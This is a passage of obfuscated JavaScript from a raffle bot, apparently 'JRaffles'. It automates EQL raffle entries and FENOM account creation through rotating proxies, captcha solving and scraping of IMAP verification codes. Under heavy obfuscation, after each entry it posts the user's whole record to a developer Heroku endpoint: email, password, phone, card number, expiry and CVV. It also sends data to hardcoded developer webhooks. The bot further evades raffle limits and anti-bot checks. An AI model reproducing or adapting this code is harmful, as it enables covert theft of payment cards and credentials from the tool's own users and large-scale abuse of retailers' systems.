                            await _0x41ed31(0x3e8), await _0x4d9653['type']('#address1', _0x23a9d7[_0x56cb1c]['Address1'] + '\x20' + _0x23a9d7[_0x56cb1c]['HouseNumber']), await _0x41ed31(0x1f4), await _0x4d9653['type']('#address2', '' + _0x23a9d7[_0x56cb1c]['Address2']), await _0x41ed31(0x1f4), await _0x4d9653['type']('#city', '' + _0x23a9d7[_0x56cb1c]['City']), await _0x41ed31(0x1f4), await _0x4d9653['type']('#postcode', '' + _0x23a9d7[_0x56cb1c]['Zip']), await _0x41ed31(0x3e8), await _0x4d9653['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ed31(0x3e8), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x28780e = await _0x4d9653['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x28780e && (await _0x4d9653['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d9653['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x4d9653['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ed31(0x4b0), await _0x4d9653['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ed31(0x1f4), await _0x4d9653['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CardNumber']), await _0x41ed31(0x320), await _0x4d9653['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4d9653['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x4d9653['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['ExpiryDate']), await _0x41ed31(0x4b0), await _0x4d9653['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4d9653['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x4d9653['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CVV']), await _0x41ed31(0x226), await _0x4d9653['type']('input[name=\x22postalCode\x22]', '' + _0x23a9d7[_0x56cb1c]['Zip']), await _0x41ed31(0x226));
                            const _0x2ec767 = await _0x4d9653['$']('.__PrivateStripeElement');
                            _0x2ec767 && (await _0x41ed31(0x1f4), await _0x4d9653['click']('.__PrivateStripeElement'), await _0x4d9653['click']('.__PrivateStripeElement'), await _0x4d9653['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CardNumber']), await _0x4d9653['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['ExpiryDate']), await _0x4d9653['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CVV']));
                            await _0x41ed31(0x226), await _0x4d9653['click']('#paymentConsent'), await _0x41ed31(0x226), await _0x4d9653['click']('#termsConsent'), await _0x41ed31(0x2bc), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x4d9653['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ed31(0x2710);
                            try {
                                await _0x4d9653['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x41ed31(0xbb8), await _0x4d9653['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x38cc48 => _0x38cc48['click']()), await _0x4d9653['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1494a3 => _0x1494a3['click']());
                            } catch {
                            }
                            try {
                                await _0x4d9653['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x36c443 = await _0x4d9653['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x36c443) {
                                    _0x223df9['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x23a9d7[_0x56cb1c]['Email'] + ',' + _0x23a9d7[_0x56cb1c]['Password'] + ',' + _0x23a9d7[_0x56cb1c]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x421133() {
                                var _0xc4173, _0x330b71 = ![];
                                for (var _0x946f32 = 0x0; _0x946f32 < 0x18; _0x946f32++) {
                                    async function _0x478d65() {
                                        var _0x3f2c7f = new _0x2fa2c3({
                                            'user': _0x4ae33b['masterMail'],
                                            'password': _0x4ae33b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x430667(_0x3d13bc) {
                                            _0x3f2c7f['openBox']('INBOX', ![], _0x3d13bc);
                                        }
                                        _0x3f2c7f['once']('ready', function () {
                                            console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x430667(function (_0x53271e, _0x556031) {
                                                console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x53271e)
                                                    throw _0x53271e;
                                                _0x3f2c7f['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x5a26fa, _0x33ddb8) {
                                                    if (!_0x33ddb8 || !_0x33ddb8['length'])
                                                        console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x3f2c7f['end']();
                                                    else {
                                                        var _0x387147 = _0x3f2c7f['seq']['fetch'](_0x33ddb8, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x387147['on']('message', function (_0x4cf278, _0x431fdb) {
                                                            var _0x219c2d = '(#' + _0x431fdb + ')\x20';
                                                            _0x4cf278['on']('body', function (_0x204247, _0x2fd4dd) {
                                                                _0x44103a(_0x204247, (_0x48da30, _0x32cce0) => {
                                                                    if (_0x32cce0['subject']['includes']('code')) {
                                                                        const _0x94056b = _0x32cce0['text']['split']('\x0a\x0a')[0x3], _0x38267b = _0x94056b['split']('\x0a')[0x1];
                                                                        _0xc4173 = _0x38267b;
                                                                    }
                                                                });
                                                            }), _0x4cf278['once']('end', function () {
                                                            });
                                                        }), _0x387147['once']('error', function (_0x56f61a) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x387147['once']('end', function () {
                                                            _0x3f2c7f['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x3f2c7f['once']('error', function (_0x4f65e0) {
                                            console['log'](_0x3dfcf2['red'](_0x4f65e0['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x330b71 = !![];
                                        }), _0x3f2c7f['once']('end', async function () {
                                        }), _0x3f2c7f['connect']();
                                    }
                                    _0x478d65(), await _0x41ed31(0x1388);
                                    if (_0xc4173)
                                        return _0xc4173;
                                    if (_0x330b71)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x946f32 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x421133(), await _0x41ed31(0x1f4), await _0x4d9653['type']('#code', '' + code), await _0x41ed31(0x3e8), await _0x4d9653['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x124c53 => _0x124c53['click']()), await _0x4d9653['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x4d9653['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x23a9d7[_0x56cb1c]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x223df9['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x23a9d7[_0x56cb1c]['Email'] + ',' + _0x23a9d7[_0x56cb1c]['Password'] + ',' + _0x23a9d7[_0x56cb1c]['Phone']), _0xd8834 = 'no', _0x13e83d(_0x23a9d7[_0x56cb1c], _0xe15fbb);
                            var _0x334a3e = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'dev', ![]), _0xbd044a = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'pub', ![]);
                            let _0x32e963 = _0x23a9d7[_0x56cb1c];
                            try {
                                prxdata = {
                                    'username': _0x128b96['replace']('#', ''),
                                    'module': _0xe15fbb['name'],
                                    'entrydata': JSON['stringify'](_0x32e963),
                                    'proxy': '' + _0x1acb52[_0x56cb1c]
                                };
                                var _0x1e5aec = JSON['stringify'](prxdata);
                                let _0x1a0ef9 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x1e5aec, _0x1a0ef9);
                            } catch (_0x22bbdd) {
                            }
                            const _0x520f90 = {
                                'succesDEVMSG': { 'embeds': [_0x334a3e] },
                                'succesPUBMSG': { 'embeds': [_0xbd044a] }
                            };
                            try {
                                _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x520f90['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x520f90['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x520f90['succesPUBMSG']);
                            } catch (_0x55c0a3) {
                                console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x55c0a3));
                            }
                        } catch (_0x28b8d7) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20' + _0x28b8d7)), _0x433bab = '' + _0x28b8d7;
                            var _0x3584da = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'dev', !![], _0x433bab), _0x334a3e = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'dev', ![]), _0xbd044a = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'pub', ![]);
                            const _0x332cf5 = {
                                'succesDEVMSG': { 'embeds': [_0x334a3e] },
                                'succesPUBMSG': { 'embeds': [_0xbd044a] }
                            };
                            _0x332cf5['errorDEV'] = { 'embeds': [_0x3584da] };
                            _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x332cf5['errorDEV']);
                            await _0x48936e(_0x36657d, _0x332cf5['errorDEV']);
                            if (!_0xd8834 == 'no')
                                _0xd8834 = 'yes';
                        } finally {
                            _0x26d586 && _0x26d586['close']();
                            if (_0xd8834 == 'yes' && _0x4af555 != 0x5) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Retrying\x20(' + _0x4af555 + '\x20/\x205)')), _0x56cb1c = _0x56cb1c - 0x1, _0x4af555 = _0x4af555 + 0x1;
                                continue;
                            }
                            _0xd8834 == 'yes' && _0x4af555 >= 0x5 && (_0x2504ad(_0x23a9d7[_0x56cb1c], _0xe15fbb), _0xd8834 = 'no', _0x4af555 = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    } else {
                        const _0x44594a = '' + _0x23a9d7[_0x56cb1c]['Url'];
                        if (_0xd8834 != 'yes')
                            var _0xd8834 = '', _0x4af555 = 0x0;
                        if (_0x23a9d7[_0x56cb1c]['Email'] == '' || _0x23a9d7[_0x56cb1c]['FirstName'] == '' || _0x23a9d7[_0x56cb1c]['LastName'] == '') {
                            console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x23a9d7[_0x56cb1c]['Password'] == '' && (_0x23a9d7[_0x56cb1c]['Password'] = 'JRaffles23!');
                        if (_0x4ae33b['useRandomProxy'] = ![])
                            var _0x363339 = _0x1acb52[_0x56cb1c]['split'](':');
                        else
                            var _0x24cdd2 = Math['round'](Math['random']() * (_0x1acb52['length'] - 0x1)), _0x363339 = _0x1acb52[_0x24cdd2]['split'](':');
                        var _0x26d586;
                        try {
                            _0x26d586 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x363339[0x0] + ':' + _0x363339[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x26d586 = await _0x23e690['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x363339[0x0] + ':' + _0x363339[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2d0d19 = await _0x26d586['newPage']();
                            await _0x2d0d19['authenticate']({
                                'username': '' + _0x363339[0x2],
                                'password': '' + _0x363339[0x3]
                            }), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2d0d19['setRequestInterception'](!![]), _0x2d0d19['on']('request', _0x244e73 => {
                                _0x244e73['resourceType']() === 'image' || _0x244e73['resourceType']() === 'font' || _0x244e73['resourceType']() === 'media' ? _0x244e73['abort']() : _0x244e73['continue']();
                            }), await _0x2d0d19['goto'](_0x44594a), await _0x2d0d19['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button');
                            let _0x4ed800 = await _0x2d0d19['$']('#gatsby-focus-wrapper\x20>\x20div:nth-child(3)\x20>\x20div\x20>\x20div\x20>\x20span\x20>\x20div\x20>\x20button.MuiButton-root.MuiButton-contained.MuiButton-containedSecondary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButtonBase-root.css-78bdfl');
                            if (_0x4ed800)
                                await _0x4ed800['click']();
                            await _0x41ed31(0x7d0), await _0x2d0d19['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x41ed31(0x7d0), await _0x2d0d19['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2d0d19['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x41ed31(0x3e8), await _0x2d0d19['waitForSelector']('#email'), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2d0d19['type']('#email', '' + _0x23a9d7[_0x56cb1c]['Email']), await _0x41ed31(0x352), await _0x2d0d19['waitForSelector']('#password'), await _0x2d0d19['type']('#password', '' + _0x23a9d7[_0x56cb1c]['Password']), await _0x41ed31(0x352), await _0x2d0d19['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ed31(0x1388);
                            if (!_0x23a9d7[_0x56cb1c]['Url']['includes']('footlocker') && !_0x23a9d7[_0x56cb1c]['Url']['includes']('topps'))
                                await _0x2d0d19['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            let _0x4310a8 = await _0x2d0d19['$']('#productQuantity'), _0x14f4fd = await _0x2d0d19['$']('div[data-testid=\x22field-productVariantID');
                            if (!_0x14f4fd && !_0x4310a8) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0xd8834 = 'no';
                                continue;
                            }
                            if (_0x14f4fd) {
                                await _0x2d0d19['click']('div[data-testid=\x22field-productVariantID\x22]');
                                try {
                                    _0x23a9d7[_0x56cb1c]['Url']['includes']('en-GB') ? await _0x2d0d19['click']('li[data-value=\x22UK\x20' + _0x23a9d7[_0x56cb1c]['Size'] + '\x20/\x20US\x20' + (Number(_0x23a9d7[_0x56cb1c]['Size']) + 0x1) + '\x22]') : await _0x2d0d19['click']('li[data-value=\x22EU\x20' + _0x23a9d7[_0x56cb1c]['Size'] + '\x22]');
                                } catch {
                                    throw new Error('Error\x20fetching\x20size\x20' + _0x23a9d7[_0x56cb1c]['Size']);
                                }
                            }
                            _0x4310a8 && (await _0x2d0d19['click']('#productQuantity'), await _0x41ed31(0x3e8), await _0x2d0d19['click']('li[data-value=\x22' + (Number(_0x23a9d7[_0x56cb1c]['Size']) - 0x1) + '\x22]'));
                            await _0x41ed31(0x3e8), await _0x41ed31(0x1f4);
                            const _0x41e37e = await _0x2d0d19['$']('#title\x20>\x20label');
                            await _0x41ed31(0x12c);
                            _0x41e37e && await _0x41e37e['click']();
                            await _0x2d0d19['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2d0d19['focus']('#postcode'), await _0x2d0d19['keyboard']['down']('Control'), await _0x2d0d19['keyboard']['press']('A'), await _0x2d0d19['keyboard']['up']('Control'), await _0x2d0d19['keyboard']['press']('Backspace'), await _0x2d0d19['keyboard']['type'](_0x23a9d7[_0x56cb1c]['Zip']), await _0x41ed31(0x60e), await _0x2d0d19['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ed31(0x3e8), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x41ed31(0x1f4);
                            const _0x5d567d = await _0x2d0d19['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x5d567d && (await _0x2d0d19['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2d0d19['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2d0d19['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ed31(0x4b0), await _0x2d0d19['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x41ed31(0x1f4), await _0x2d0d19['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CardNumber']), await _0x41ed31(0x320), await _0x2d0d19['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2d0d19['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['ExpiryDate']), await _0x41ed31(0x4b0), await _0x2d0d19['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2d0d19['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CVV']), await _0x41ed31(0x226), await _0x2d0d19['type']('input[name=\x22postalCode\x22]', '' + _0x23a9d7[_0x56cb1c]['Zip']), await _0x41ed31(0x226));
                            const _0x371d31 = await _0x2d0d19['$']('.__PrivateStripeElement');
                            _0x371d31 && (await _0x2d0d19['click']('#billingName'), await _0x2d0d19['click']('#billingName'), await _0x2d0d19['type']('#billingName', '' + _0x23a9d7[_0x56cb1c]['NameOnCard']), await _0x41ed31(0x1f4), await _0x2d0d19['click']('.__PrivateStripeElement'), await _0x2d0d19['click']('.__PrivateStripeElement'), await _0x2d0d19['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CardNumber']), await _0x2d0d19['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['ExpiryDate']), await _0x2d0d19['keyboard']['type']('' + _0x23a9d7[_0x56cb1c]['CVV']));
                            await _0x41ed31(0x226), await _0x2d0d19['click']('#paymentConsent'), await _0x41ed31(0x226), await _0x2d0d19['click']('#termsConsent'), await _0x41ed31(0x2bc), console['log'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2d0d19['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x41ed31(0x2710);
                            try {
                                await _0x2d0d19['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x41ed31(0xbb8), await _0x2d0d19['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x493844 => _0x493844['click']()), await _0x2d0d19['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x3498f4 => _0x3498f4['click']());
                            } catch {
                            }
                            try {
                                await _0x2d0d19['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x3dfcf2['green'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x13e83d(_0x23a9d7[_0x56cb1c], _0xe15fbb);
                            var _0x334a3e = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'dev', ![]), _0xbd044a = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'pub', ![]);
                            let _0x3b170e = _0x23a9d7[_0x56cb1c];
                            try {
                                prxdata = {
                                    'username': _0x128b96['replace']('#', ''),
                                    'module': _0xe15fbb['name'],
                                    'entrydata': JSON['stringify'](_0x3b170e),
                                    'proxy': '' + _0x1acb52[_0x56cb1c]
                                };
                                var _0x1e5aec = JSON['stringify'](prxdata);
                                let _0x3ca0e1 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x48af5a['post']('https://jraffles.herokuapp.com/success', _0x1e5aec, _0x3ca0e1);
                            } catch (_0x55a8dd) {
                            }
                            const _0x2015fc = {
                                'succesDEVMSG': { 'embeds': [_0x334a3e] },
                                'succesPUBMSG': { 'embeds': [_0xbd044a] }
                            };
                            try {
                                _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x2015fc['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x3a625c, _0x2015fc['succesDEVMSG']), await _0x41ed31(0xc8), await _0x48936e(_0x22a07c, _0x2015fc['succesPUBMSG']);
                            } catch (_0x2cda5e) {
                                console['log'](_0x3dfcf2['yellow'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2cda5e));
                            }
                            _0xd8834 = 'no';
                        } catch (_0x5b0f06) {
                            console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20' + _0x5b0f06)), _0x433bab = '' + _0x5b0f06;
                            var _0x3584da = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'dev', !![], _0x433bab), _0x334a3e = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'dev', ![]), _0xbd044a = await _0x559dec(_0x23a9d7[_0x56cb1c], _0xe15fbb, 'pub', ![]);
                            const _0x29e60a = {
                                'succesDEVMSG': { 'embeds': [_0x334a3e] },
                                'succesPUBMSG': { 'embeds': [_0xbd044a] }
                            };
                            _0x29e60a['errorDEV'] = { 'embeds': [_0x3584da] }, _0x4ae33b['webhook'] != undefined && _0x4ae33b['webhook'] != '' && await _0x48936e(_0x4ae33b['webhook'], _0x29e60a['errorDEV']), await _0x48936e(_0x36657d, _0x29e60a['errorDEV']), _0xd8834 = 'yes';
                        } finally {
                            _0x26d586 && _0x26d586['close']();
                            if (_0xd8834 == 'yes' && _0x4af555 != 0x5) {
                                console['log'](_0x3dfcf2['red'](_0x82e5a5() + '\x20[' + _0xe15fbb['name'] + ']\x20Task\x20' + (_0x56cb1c + 0x1) + '\x20:\x20Retrying\x20(' + _0x4af555 + '\x20/\x205)')), _0x56cb1c = _0x56cb1c - 0x1, _0x4af555 = _0x4af555 + 0x1;
                                continue;
                            }
                            _0xd8834 == 'yes' && _0x4af555 >= 0x5 && (_0x2504ad(_0x23a9d7[_0x56cb1c], _0xe15fbb), _0xd8834 = 'no', _0x4af555 = 0x0), console['log']('Waiting\x20for\x20' + _0x4ae33b['delay'] + '\x20ms'), await _0x41ed31(_0x4ae33b['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x1108ca, _0x2c535d, _0x5efe42) {
                    var _0x4270ca = _0x2c535d, _0x3c085e = 0x0;
                    for (var _0x37f59b = 0x0; _0x37f59b < _0x2c535d['length']; _0x37f59b++) {
                        maxTasks = Number(_0x4ae33b['threads']);
                        while (_0x3c085e >= maxTasks) {
                            await _0x41ed31(_0x4ae33b['delay']);
                        }
                        let _0x1c3485 = ![];
                        async function _0x2b6c1a(_0x46a91c, _0x5da702, _0x29251e, _0x515cdb, _0x309608) {
                            _0x3c085e++, _0x23e690['use'](_0x57a02e()), _0x23e690['use'](_0x2aeb7e({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x4ae33b['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x8f6848 != 'yes')
                                var _0x8f6848 = '', _0x309608 = 0x0;
                            var _0x28571f;
                            try {
                                await _0x101e1b(_0x5da702, _0x515cdb);
                            } catch {
                                _0x8f6848 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x445891(_0x46a91c['name'] + '\x20Task\x20' + (_0x515cdb + 0x1) + '\x20/\x20' + _0x5da702['length'] + '\x20||\x20File:\x20' + _0x4d7b48 + '\x20Proxies:\x20' + _0x2bc9a5);
                            var _0x5ca4b8 = await _0x559dec(_0x5da702[_0x515cdb], _0x46a91c, 'acc', ![]);
                            const _0x4c5639 = { 'succesDEVMSG': { 'embeds': [_0x5ca4b8] } }, _0xada6ec = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x2935e1 = Math['round'](Math['random']() * (_0x29251e['length'] - 0x1)), _0x3281b2 = _0x29251e[_0x2935e1]['split'](':'), _0x321b29;
                            async function _0xea3ab7(_0x430eaf) {
                                const _0x10ad2e = _0x223df9['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x4066cc = _0x57f277['parse'](_0x10ad2e, { 'header': !![] })['data'];
                                let _0x2a65b4 = ![];
                                for (var _0x32630c of _0x4066cc) {
                                    if (_0x32630c['Email'] == _0x430eaf['Email']) {
                                        _0x2a65b4 = !![];
                                        break;
                                    }
                                }
                                return _0x2a65b4;
                            }
                            try {
                                if (await _0xea3ab7(_0x5da702[_0x515cdb]) == !![]) {
                                    console['log'](_0x82e5a5() + '\x20[' + _0x46a91c['name'] + ']\x20Task\x20' + (_0x515cdb + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x1c3485 = !![], dupli = !![];
